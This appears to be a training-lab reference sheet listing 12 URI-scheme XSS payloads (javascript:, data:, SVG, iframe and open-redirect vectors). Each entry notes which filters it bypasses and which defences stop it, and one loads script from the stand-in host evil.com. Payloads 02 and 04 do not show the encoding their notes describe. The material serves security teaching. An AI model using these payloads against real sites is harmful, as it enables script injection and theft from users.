03 — URI Scheme Injection

12 payloads · Mechanism: URI Schemes · Module reference: M06 · Lab endpoint: http://localhost:5000/redirect?url=PAYLOAD
A. javascript: in Navigable Attributes
URI SCHEMECLASSIC
01
<a href="javascript:alert(document.domain)">click me</a>
ContextHTML body — href attribute with javascript: pseudo-protocol; requires click Mechanism3 — URI scheme: browser navigates to javascript: URI which executes the expression BypassesFilters passing anchor tags but not checking href protocol Stopped byCSP; sanitizers stripping javascript: from href; URL allowlist validation OriginThe canonical javascript: URI vector. Requires a click. High severity in open redirect bugs where the redirect destination is user-controlled.
URI SCHEMEENCODING
02
<a href="javascript:alert(1)">click</a>
ContextHTML body — "javascript:" is HTML-entity encoded in decimal Mechanism3 — URI scheme; HTML entities decode to "javascript:" before browser evaluates href BypassesFilters matching literal "javascript:" in href before HTML-decoding Stopped bySanitizers that decode HTML entities before checking href protocol; CSP OriginEach character is its decimal HTML entity. Browser decodes: &#106;=j, &#97;=a… The browser, not the filter, handles the decoding — so pre-decoding in the filter is mandatory.
URI SCHEMEENCODING
03
<a href="jAvAsCrIpT:alert(1)">click</a>
ContextHTML body — javascript: scheme is case-mixed Mechanism3 — URI scheme (case-insensitive per RFC 3986) BypassesFilters matching only lowercase "javascript:" Stopped byCase-insensitive protocol check; allowlist approach (only allow http/https) OriginURI schemes are case-insensitive per the RFC. The browser normalises to lowercase. Allowlist approach (only allow https://) is far safer than blocklist (block javascript:).
URI SCHEMEENCODING
04
<a href="java script:alert(1)">click</a>
ContextHTML body — tab character (&#9;) inside the scheme name Mechanism3 — URI scheme; browsers strip whitespace chars (tab, newline, CR) from href before parsing scheme BypassesFilters matching "javascript:" without stripping whitespace first Stopped byStripping all whitespace from href before protocol check; allowlist; CSP OriginBrowsers follow RFC 3986 and strip tab/LF/CR from URL values. A tab (ASCII 9) inside "javascript:" is removed by the browser before scheme comparison. Filter must do the same.
URI SCHEMEWHITESPACE
05
<a href=" javascript:alert(1)">click</a>
ContextHTML body — leading spaces before the scheme name Mechanism3 — URI scheme; browsers trim leading whitespace from href values BypassesstartsWith("javascript:") checks that don't trim first Stopped by.trim() before protocol check; allowlist approach Originhref values with leading whitespace are trimmed by browsers before navigation. A check for startsWith("javascript:") fails when there's a leading space. Always trim before checking.
B. data: URI as Inline Document
URI SCHEMEFILTER BYPASS
06
<a href="data:text/html,<script>alert(document.domain)</script>">click</a>
ContextHTML body — href is a data: URI containing an HTML document with a script Mechanism3 — URI scheme: data:text/html loads a new document in same context BypassesFilters blocking javascript: but passing data: Stopped byCSP navigate-to or blocking data: in href; allowlist href to https only; modern browsers restrict data: navigation Origindata:text/html loads a full HTML document. In older browsers it ran in the originating origin. Modern Chrome/Firefox treat navigated data: URIs as opaque origin — reduced impact but still a concern in older apps and WebViews.
URI SCHEMEENCODING
07
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
ContextHTML body — data URI with base64-encoded HTML payload Mechanism3 — URI scheme: data:text/html;base64 — browser decodes base64 before parsing BypassesFilters scanning data: URI content for script/alert keywords (can't see through base64) Stopped byCSP; allowlist href; base64-decoding before content scanning OriginThe base64 decodes to <script>alert(1)</script>. Content-scanning filters must also decode base64 sections. Demonstrates why content-scanning is fundamentally harder than structural approaches.
C. Open Redirectors as XSS Delivery
URI SCHEMEOPEN REDIRECT
08
http://localhost:5000/redirect?url=javascript:alert(document.domain)
ContextOpen redirect endpoint that passes the url param to Location header or window.location Mechanism3 — URI scheme: redirect sets location to javascript: URI which executes in the originating context BypassesCSRF defenses (the redirect URL is fully attacker-controlled); filters checking only the original page URL Stopped byValidating the redirect target against an allowlist of safe URLs; rejecting non-http/https schemes in redirect destinations OriginOpen redirectors are frequently used to make phishing links look legitimate. When the destination is javascript:, they become XSS delivery. Test with the lab's /redirect endpoint.
URI SCHEMEFILTER BYPASS
09
http://localhost:5000/redirect?url=%6a%61%76%61%73%63%72%69%70%74%3aalert(1)
ContextOpen redirect — "javascript:" is URL-percent-encoded Mechanism3 — URI scheme after URL decoding by the redirect handler BypassesRedirect handlers that check the raw parameter string before URL-decoding it Stopped byURL-decoding before checking; allowlist approach Origin%6a%61%76%61%73%63%72%69%70%74%3a = "javascript:". Server URL-decodes the parameter and sets Location header. Browser follows the decoded URI. Check after decoding, not before.
D. Protocol-Relative and Double-Slash Tricks
URI SCHEMEFILTER BYPASS
10
<script src="//evil.com/xss.js"></script>
ContextHTML body — protocol-relative URL inherits the page protocol (http or https) Mechanism1 + 3 — Script tag loading external JS via protocol-relative URL BypassesFilters that check for "http://" or "https://" as required prefix but pass "//" as seemingly relative Stopped byCSP script-src restricting to known domains; output encoding; SRI OriginProtocol-relative URLs (//host/path) inherit the page's scheme. Used in supply chain injection to load attacker-controlled JS that works on both http and https pages.
URI SCHEMEFILTER BYPASS
11
<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><foreignObject><script>alert(1)</script></foreignObject></svg>#x"></use></svg>
ContextHTML body — SVG use element with xlink:href to data: URI containing an SVG with foreignObject Mechanism3 + 4 (namespace) — data: URI + SVG namespace + foreignObject allows HTML script execution BypassesFilters allowing SVG use element but not inspecting the href value for executable content Stopped byCSP; sanitizers blocking data: in SVG href; blocking foreignObject in SVG OriginSVG foreignObject allows embedding arbitrary HTML inside SVG. Combined with data: URI as the href for use element, this creates a multi-layer execution path. Documented in PortSwigger research.
URI SCHEMEFILTER BYPASS
12
<iframe src="javascript:document.write('<script>alert(parent.document.domain)<\/script>')"></iframe>
ContextHTML body — iframe src with javascript: URI that document.writes a script tag Mechanism3 — URI scheme: javascript: src creates a blank document in the iframe; document.write injects script BypassesFilters scanning iframe src for "script" keyword (the word appears inside a string literal) Stopped byCSP; blocking javascript: in iframe src; output encoding; sandbox attribute on iframe OriginThe iframe gets a blank about:blank document (inheriting origin). javascript: as iframe src writes into that document. parent.document is accessible same-origin. Classic double-layer technique.
